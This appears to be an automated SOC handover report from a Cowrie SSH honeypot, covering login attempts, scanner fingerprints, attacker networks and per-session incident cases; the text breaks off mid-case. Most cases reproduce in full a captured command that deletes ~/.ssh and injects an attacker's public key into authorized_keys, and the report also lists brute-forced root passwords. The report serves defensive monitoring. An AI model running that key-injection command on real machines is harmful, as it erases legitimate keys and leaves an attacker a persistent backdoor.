# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-01 |
| **Generated At** | 2026-05-01T09:50:41Z |
| **Shift Time** | 09:50 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **793** |
| Confirmed Threats | **137** |
| False Positives Filtered | **656** (82.7%) |
| Unique Attacker IPs | **42** |
| Countries of Origin | **21** |
| High Severity Cases | **16** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **777** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **74** |
| Unique Credential Pairs | **54** |
| Unique Usernames | **36** |
| Unique Passwords | **49** |
| Successful Auth Pairs | **12** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 16 |
| `345gs5662d34` | 8 |
| `ubuntu` | 7 |
| `test` | 3 |
| `user` | 3 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 8 |
| `3245gs5662d34` | 8 |
| `123456` | 5 |
| `1234` | 2 |
| `Host: 13.235.92.17:23` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 8 |
| `root` | `3245gs5662d34` | 8 |
| `GET / HTTP/1.1` | `Host: 13.235.92.17:23` | 2 |
| `server` | `1qaz` | 2 |
| `tuser` | `123456` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `madmin123` | `80.102.218.187` | 2026-05-01T08:11:31 |
| `root` | `3245gs5662d34` | `80.102.218.187` | 2026-05-01T08:11:36 |
| `root` | `gw1admin` | `80.102.218.187` | 2026-05-01T08:16:02 |
| `root` | `admin@456` | `80.102.218.187` | 2026-05-01T08:29:22 |
| `root` | `admin007` | `46.29.234.127` | 2026-05-01T08:30:43 |
| `root` | `3245gs5662d34` | `46.29.234.127` | 2026-05-01T08:30:48 |
| `root` | `server2012` | `80.102.218.187` | 2026-05-01T08:31:54 |
| `root` | `admin007` | `80.102.218.187` | 2026-05-01T08:34:30 |
| `root` | `Yu123456` | `190.167.237.191` | 2026-05-01T09:29:39 |
| `root` | `3245gs5662d34` | `190.167.237.191` | 2026-05-01T09:29:45 |
| `root` | `mediaserviceadmin` | `209.99.184.143` | 2026-05-01T09:45:44 |
| `root` | `3245gs5662d34` | `209.99.184.143` | 2026-05-01T09:45:48 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **793** |
| Sessions with Fingerprint | **5** |
| Unique HASSH Fingerprints | **5** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 93 |
| Go SSH scanner | 2 |
| AsyncSSH (Python) | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `af8223ac9914...` | libssh-based | 49 | 4 |
| `03a80b21afa8...` | Modern SSH client | 40 | 7 |
| `17a5327c6d98...` | Mirai/variant | 2 | 1 |
| `fda360b1b4f4...` | Mirai/variant | 2 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `af8223ac9914...` | libssh | 49 | 4 | libssh-based |
| `03a80b21afa8...` | libssh | 40 | 7 | Modern SSH client |
| `95420f9d932d...` | libssh | 4 | 3 | — |
| `17a5327c6d98...` | Go SSH scanner | 2 | 1 | Mirai/variant |
| `fda360b1b4f4...` | AsyncSSH (Python) | 2 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 8 | 4 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `80.102.218.187`, `209.99.184.143`, `46.29.234.127`, `190.167.237.191`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **42** |
| Unique ASNs | **35** |
| High-Risk ASNs | **16** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4811` | China Telecom (Group) | 4 | HIGH |
| `AS263717` | SOL TELECOMUNICACIONES S.A. | 2 | HIGH |
| `AS51167` | Contabo GmbH | 2 | LOW |
| `AS48090` | TECHOFF SRV LIMITED | 2 | HIGH |
| `AS9541` | Cyber Internet Services (Pvt) Ltd. | 2 | MEDIUM |
| `AS25671` | Wholesale Air-time Inc. | 1 | MEDIUM |
| `AS271744` | Alfacom telecomunições e multimidia LTDA | 1 | LOW |
| `AS46606` | Unified Layer | 1 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (16)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-16e642599532

| Field | Detail |
|---|---|
| **Source IP** | `80.102.218[.]187` |
| **First Seen** | 2026-05-01 08:11 |
| **Last Seen** | 2026-05-01 08:11 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 08:11:30` | `cowrie.session.connect` |
| `2026-05-01 08:11:30` | `cowrie.client.version` |
| `2026-05-01 08:11:30` | `cowrie.client.kex` |
| `2026-05-01 08:11:31` | `cowrie.login.success` |
| `2026-05-01 08:11:32` | `cowrie.session.params` |
| `2026-05-01 08:11:32` | `cowrie.command.input` |
| `2026-05-01 08:11:32` | `cowrie.command.failed` |
| `2026-05-01 08:11:32` | `cowrie.log.closed` |
| `2026-05-01 08:11:32` | `cowrie.session.params` |
| `2026-05-01 08:11:32` | `cowrie.command.input` |
| `2026-05-01 08:11:32` | `cowrie.session.file_download` |
| `2026-05-01 08:11:32` | `cowrie.log.closed` |
| `2026-05-01 08:11:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.102.218[.]187` to AbuseIPDB if not already reported
- [ ] Block `80.102.218[.]187` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49862b4de8aa

| Field | Detail |
|---|---|
| **Source IP** | `80.102.218[.]187` |
| **First Seen** | 2026-05-01 08:11 |
| **Last Seen** | 2026-05-01 08:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 08:11:35` | `cowrie.session.connect` |
| `2026-05-01 08:11:35` | `cowrie.client.version` |
| `2026-05-01 08:11:36` | `cowrie.client.kex` |
| `2026-05-01 08:11:36` | `cowrie.login.success` |
| `2026-05-01 08:11:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.102.218[.]187` to AbuseIPDB if not already reported
- [ ] Block `80.102.218[.]187` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2006e25530ee

| Field | Detail |
|---|---|
| **Source IP** | `80.102.218[.]187` |
| **First Seen** | 2026-05-01 08:16 |
| **Last Seen** | 2026-05-01 08:16 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 08:16:01` | `cowrie.session.connect` |
| `2026-05-01 08:16:01` | `cowrie.client.version` |
| `2026-05-01 08:16:01` | `cowrie.client.kex` |
| `2026-05-01 08:16:02` | `cowrie.login.success` |
| `2026-05-01 08:16:02` | `cowrie.session.params` |
| `2026-05-01 08:16:02` | `cowrie.command.input` |
| `2026-05-01 08:16:02` | `cowrie.command.failed` |
| `2026-05-01 08:16:02` | `cowrie.log.closed` |
| `2026-05-01 08:16:03` | `cowrie.session.params` |
| `2026-05-01 08:16:03` | `cowrie.command.input` |
| `2026-05-01 08:16:03` | `cowrie.session.file_download` |
| `2026-05-01 08:16:03` | `cowrie.log.closed` |
| `2026-05-01 08:16:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.102.218[.]187` to AbuseIPDB if not already reported
- [ ] Block `80.102.218[.]187` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72a8454587bc

| Field | Detail |
|---|---|
| **Source IP** | `80.102.218[.]187` |
| **First Seen** | 2026-05-01 08:16 |
| **Last Seen** | 2026-05-01 08:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 08:16:05` | `cowrie.session.connect` |
| `2026-05-01 08:16:05` | `cowrie.client.version` |
| `2026-05-01 08:16:06` | `cowrie.client.kex` |
| `2026-05-01 08:16:06` | `cowrie.login.success` |
| `2026-05-01 08:16:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.102.218[.]187` to AbuseIPDB if not already reported
- [ ] Block `80.102.218[.]187` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65fae0121bce

| Field | Detail |
|---|---|
| **Source IP** | `80.102.218[.]187` |
| **First Seen** | 2026-05-01 08:29 |
| **Last Seen** | 2026-05-01 08:29 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 08:29:21` | `cowrie.session.connect` |
| `2026-05-01 08:29:21` | `cowrie.client.version` |
| `2026-05-01 08:29:21` | `cowrie.client.kex` |
| `2026-05-01 08:29:22` | `cowrie.login.success` |
| `2026-05-01 08:29:22` | `cowrie.session.params` |
| `2026-05-01 08:29:22` | `cowrie.command.input` |
| `2026-05-01 08:29:22` | `cowrie.command.failed` |
| `2026-05-01 08:29:22` | `cowrie.log.closed` |
| `2026-05-01 08:29:23` | `cowrie.session.params` |
| `2026-05-01 08:29:23` | `cowrie.command.input` |
| `2026-05-01 08:29:23` | `cowrie.session.file_download` |
| `2026-05-01 08:29:23` | `cowrie.log.closed` |
| `2026-05-01 08:29:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.102.218[.]187` to AbuseIPDB if not already reported
- [ ] Block `80.102.218[.]187` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7029d5fa00d

| Field | Detail |
|---|---|
| **Source IP** | `80.102.218[.]187` |
| **First Seen** | 2026-05-01 08:29 |
| **Last Seen** | 2026-05-01 08:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 08:29:26` | `cowrie.session.connect` |
| `2026-05-01 08:29:26` | `cowrie.client.version` |
| `2026-05-01 08:29:26` | `cowrie.client.kex` |
| `2026-05-01 08:29:27` | `cowrie.login.success` |
| `2026-05-01 08:29:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.102.218[.]187` to AbuseIPDB if not already reported
- [ ] Block `80.102.218[.]187` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2e005af2ecc

| Field | Detail |
|---|---|
| **Source IP** | `46.29.234[.]127` |
| **First Seen** | 2026-05-01 08:30 |
| **Last Seen** | 2026-05-01 08:30 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 08:30:42` | `cowrie.session.connect` |
| `2026-05-01 08:30:42` | `cowrie.client.version` |
| `2026-05-01 08:30:43` | `cowrie.client.kex` |
| `2026-05-01 08:30:43` | `cowrie.login.success` |
| `2026-05-01 08:30:44` | `cowrie.session.params` |
| `2026-05-01 08:30:44` | `cowrie.command.input` |
| `2026-05-01 08:30:44` | `cowrie.command.failed` |
| `2026-05-01 08:30:44` | `cowrie.log.closed` |
| `2026-05-01 08:30:44` | `cowrie.session.params` |
| `2026-05-01 08:30:44` | `cowrie.command.input` |
| `2026-05-01 08:30:44` | `cowrie.session.file_download` |
| `2026-05-01 08:30:44` | `cowrie.log.closed` |
| `2026-05-01 08:30:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.29.234[.]127` to AbuseIPDB if not already reported
- [ ] Block `46.29.234[.]127` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c0956e568c0

| Field | Detail |
|---|---|
| **Source IP** | `46.29.234[.]127` |
| **First Seen** | 2026-05-01 08:30 |
| **Last Seen** | 2026-05-01 08:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 08:30:47` | `cowrie.session.connect` |
| `2026-05-01 08:30:47` | `cowrie.client.version` |
| `2026-05-01 08:30:47` | `cowrie.client.kex` |
| `2026-05-01 08:30:48` | `cowrie.login.success` |
| `2026-05-01 08:30:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.29.234[.]127` to AbuseIPDB if not already reported
- [ ] Block `46.29.234[.]127` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0092e2b18ee7

| Field | Detail |
|---|---|
| **Source IP** | `80.102.218[.]187` |
| **First Seen** | 2026-05-01 08:31 |
| **Last Seen** | 2026-05-01 08:31 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 08:31:53` | `cowrie.session.connect` |
| `2026-05-01 08:31:53` | `cowrie.client.version` |
| `2026-05-01 08:31:53` | `cowrie.client.kex` |
| `2026-05-01 08:31:54` | `cowrie.login.success` |
| `2026-05-01 08:31:54` | `cowrie.session.params` |
| `2026-05-01 08:31:54` | `cowrie.command.input` |
| `2026-05-01 08:31:54` | `cowrie.command.failed` |
| `2026-05-01 08:31:55` | `cowrie.log.closed` |
| `2026-05-01 08:31:55` | `cowrie.session.params` |
| `2026-05-01 08:31:55` | `cowrie.command.input` |
| `2026-05-01 08:31:55` | `cowrie.session.file_download` |
| `2026-05-01 08:31:55` | `cowrie.log.closed` |
| `2026-05-01 08:31:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.102.218[.]187` to AbuseIPDB if not already reported
- [ ] Block `80.102.218[.]187` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ea00f04ce60

| Field | Detail |
|---|---|
| **Source IP** | `80.102.218[.]187` |
| **First Seen** | 2026-05-01 08:31 |
| **Last Seen** | 2026-05-01 08:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 08:31:58` | `cowrie.session.connect` |
| `2026-05-01 08:31:58` | `cowrie.client.version` |
| `2026-05-01 08:31:58` | `cowrie.client.kex` |
| `2026-05-01 08:31:59` | `cowrie.login.success` |
| `2026-05-01 08:31:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.102.218[.]187` to AbuseIPDB if not already reported
- [ ] Block `80.102.218[.]187` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60a5e8fb062e

| Field | Detail |
|---|---|
| **Source IP** | `80.102.218[.]187` |
| **First Seen** | 2026-05-01 08:34 |
| **Last Seen** | 2026-05-01 08:34 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 08:34:29` | `cowrie.session.connect` |
| `2026-05-01 08:34:29` | `cowrie.client.version` |
| `2026-05-01 08:34:29` | `cowrie.client.kex` |
| `2026-05-01 08:34:30` | `cowrie.login.success` |
| `2026-05-01 08:34:30` | `cowrie.session.params` |
| `2026-05-01 08:34:30` | `cowrie.command.input` |
| `2026-05-01 08:34:30` | `cowrie.command.failed` |
| `2026-05-01 08:34:30` | `cowrie.log.closed` |
| `2026-05-01 08:34:31` | `cowrie.session.params` |
| `2026-05-01 08:34:31` | `cowrie.command.input` |
| `2026-05-01 08:34:31` | `cowrie.session.file_download` |
| `2026-05-01 08:34:31` | `cowrie.log.closed` |
| `2026-05-01 08:34:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.102.218[.]187` to AbuseIPDB if not already reported
- [ ] Block `80.102.218[.]187` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2cc3e9a4bebd

| Field | Detail |
|---|---|
| **Source IP** | `80.102.218[.]187` |
| **First Seen** | 2026-05-01 08:34 |
| **Last Seen** | 2026-05-01 08:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 08:34:34` | `cowrie.session.connect` |
| `2026-05-01 08:34:34` | `cowrie.client.version` |
| `2026-05-01 08:34:34` | `cowrie.client.kex` |
| `2026-05-01 08:34:34` | `cowrie.login.success` |
| `2026-05-01 08:34:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.102.218[.]187` to AbuseIPDB if not already reported
- [ ] Block `80.102.218[.]187` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-004ffd9285f7

| Field | Detail |
|---|---|
| **Source IP** | `190.167.237[.]191` |
| **First Seen** | 2026-05-01 09:29 |
| **Last Seen** | 2026-05-01 09:29 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 09:29:37` | `cowrie.session.connect` |
| `2026-05-01 09:29:37` | `cowrie.client.version` |
| `2026-05-01 09:29:38` | `cowrie.client.kex` |
| `2026-05-01 09:29:39` | `cowrie.login.success` |
| `2026-05-01 09:29:39` | `cowrie.session.params` |
| `2026-05-01 09:29:39` | `cowrie.command.input` |
| `2026-05-01 09:29:39` | `cowrie.command.failed` |
| `2026-05-01 09:29:39` | `cowrie.log.closed` |
| `2026-05-01 09:29:40` | `cowrie.session.params` |
| `2026-05-01 09:29:40` | `cowrie.command.input` |
| `2026-05-01 09:29:40` | `cowrie.session.file_download` |
| `2026-05-01 09:29:40` | `cowrie.log.closed` |
| `2026-05-01 09:29:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.167.237[.]191` to AbuseIPDB if not already reported
